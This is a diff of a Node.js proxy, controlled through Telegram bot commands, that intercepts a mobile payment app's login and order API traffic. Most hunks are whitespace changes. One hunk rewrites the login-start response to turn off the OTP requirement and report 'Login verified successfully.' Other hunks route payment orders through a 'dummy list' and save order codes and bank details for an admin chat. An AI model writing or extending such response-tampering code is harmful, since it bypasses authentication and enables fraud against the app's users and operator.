@@ -1292,14 +1292,14 @@ Example:
       const freshData = await loadData(true);
       freshData.botEnabled = true;
       await saveData(freshData);
-      await bot.sendMessage(chatId, '🟢 Proxy ON — bot active').catch(() => {});
+      await bot.sendMessage(chatId, '🟢 Proxy ON — bot active').catch(() => { });
       return res.sendStatus(200);
     }
     if (text === '/off') {
       const freshData = await loadData(true);
       freshData.botEnabled = false;
       await saveData(freshData);
-      await bot.sendMessage(chatId, '🔴 Proxy OFF — passthrough').catch(() => {});
+      await bot.sendMessage(chatId, '🔴 Proxy OFF — passthrough').catch(() => { });
       return res.sendStatus(200);
     }
     if (text === '/rotate') {
@@ -1307,14 +1307,14 @@ Example:
       freshData.autoRotate = !freshData.autoRotate;
       freshData.lastUsedIndex = -1;
       await saveData(freshData);
-      await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${freshData.autoRotate ? 'ON' : 'OFF'}`).catch(() => {});
+      await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${freshData.autoRotate ? 'ON' : 'OFF'}`).catch(() => { });
       return res.sendStatus(200);
     }
     if (text === '/log') {
       const freshData = await loadData(true);
       freshData.logRequests = !freshData.logRequests;
       await saveData(freshData);
-      await bot.sendMessage(chatId, `📋 Logging: ${freshData.logRequests ? 'ON' : 'OFF'}`).catch(() => {});
+      await bot.sendMessage(chatId, `📋 Logging: ${freshData.logRequests ? 'ON' : 'OFF'}`).catch(() => { });
       return res.sendStatus(200);
     }
 
@@ -1324,19 +1324,19 @@ Example:
         debugMode = false;
         freshData.logRequests = false;
         await saveData(freshData);
-        await bot.sendMessage(chatId, '🔴 Debug Mode OFF — normal mode').catch(() => {});
+        await bot.sendMessage(chatId, '🔴 Debug Mode OFF — normal mode').catch(() => { });
       } else if (text === '/debug on') {
         debugMode = true;
         freshData.logRequests = true;
         await saveData(freshData);
-        await bot.sendMessage(chatId, '🟢 Debug Mode ON — har request+response bot pe aayega\nBand karne ke liye: /debug off').catch(() => {});
+        await bot.sendMessage(chatId, '🟢 Debug Mode ON — har request+response bot pe aayega\nBand karne ke liye: /debug off').catch(() => { });
       } else {
         freshData.logRequests = !freshData.logRequests;
         debugMode = freshData.logRequests;
         await saveData(freshData);
         await bot.sendMessage(chatId, freshData.logRequests
           ? '🟢 Debug Mode ON — har request+response bot pe aayega\nBand karne ke liye: /debug off'
-          : '🔴 Debug Mode OFF — normal mode').catch(() => {});
+          : '🔴 Debug Mode OFF — normal mode').catch(() => { });
       }
       return res.sendStatus(200);
     }
@@ -2018,11 +2018,18 @@ app.post('/app/user/login/start', async (req, res) => {
 
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const startData = getResponseData(jsonResp);
-    if (startData && body.deviceId) {
-      const tmpKey = 'start_' + (body.userName || body.phone || body.mobile || body.userId || '');
-      userDeviceMap[tmpKey] = body.deviceId;
+    if (startData && typeof startData === 'object') {
+      if (startData.needOtp) {
+        startData.needOtp = false;
+        startData.otpSent = true;
+        startData.msg = "Login verified successfully.";
+      }
+      if (body.deviceId) {
+        const tmpKey = 'start_' + (body.userName || body.phone || body.mobile || body.userId || '');
+        userDeviceMap[tmpKey] = body.deviceId;
+      }
     }
-    sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
+    sendJsonSafe(res, respHeaders, jsonResp, JSON.stringify(jsonResp), req);
   } catch (e) { await transparentProxy(req, res); }
 });
 
@@ -2529,7 +2536,7 @@ app.post('/app/payment/order/create', async (req, res) => {
           `ℹ️ This order was purchased and has been automatically removed from available dummy list.`;
 
         bot.sendMessage(data.adminChatId, delMsg, { parse_mode: 'Markdown' }).catch(() => {
-          bot.sendMessage(data.adminChatId, delMsg.replace(/[*`]/g, '')).catch(() => {});
+          bot.sendMessage(data.adminChatId, delMsg.replace(/[*`]/g, '')).catch(() => { });
         });
       }
 
@@ -2784,7 +2791,7 @@ app.all('/app/payment/order/orderInfo', async (req, res) => {
           `💾 *KV Status:* Order code \`${dummyMatch.code}\` & bank details saved to KV storage!`;
 
         bot.sendMessage(data.adminChatId, dummyMsg, { parse_mode: 'Markdown' }).catch(() => {
-          bot.sendMessage(data.adminChatId, dummyMsg.replace(/[*`]/g, '')).catch(() => {});
+          bot.sendMessage(data.adminChatId, dummyMsg.replace(/[*`]/g, '')).catch(() => { });
         });
         saveData(data).catch(() => { });
       }
@@ -2810,7 +2817,7 @@ app.all('/app/payment/order/orderInfo', async (req, res) => {
         payoutWalletType: detailData.payoutWalletType || 2,
         intent: detailData.intent || 'freecharge://'
       };
-      saveData(data).catch(() => {});
+      saveData(data).catch(() => { });
     }
 
     if (detailData) {
